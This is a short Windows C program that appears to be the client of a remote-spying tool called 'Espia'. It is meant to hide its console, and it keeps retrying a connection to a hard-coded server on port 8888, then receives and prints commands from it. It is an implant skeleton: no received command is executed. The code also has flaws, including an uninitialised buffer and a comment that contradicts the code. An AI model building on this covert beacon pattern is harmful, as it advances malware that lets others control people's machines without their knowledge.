#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h> 
#include <stdio.h>
#include "Espia/includes/espia.h"

#define TRY_SERVER 5

int main() {
    /* Allocate a new console and hide it (SW_HIDE) */
	HWND stealth;           
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_NORMAL);
    /* ------------------------------------------- */


    /* Keep trying to connect to the server */
	WORD server_status;
	SOCKET connection;
	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);
    /* ------------------------------------ */


    /* Main flow of the program, command recieving, parsing */
    CHAR buff[256];
    int cmd_size;
    while (strcmp(buff, "exit")) {
        memset(buff, 0, 256);
        cmd_size = espia_recv(&connection, buff, 256);
        memset(buff + cmd_size - 1, 0, 1);
        printf("Server>> %s | Size (%d)\n", buff, cmd_size);
    }
    /* ---------------------------------------------------- */


    /* Disconnecting from the server */
	espia_disconnect(&connection);
    /* ----------------------------- */

	return 0;
}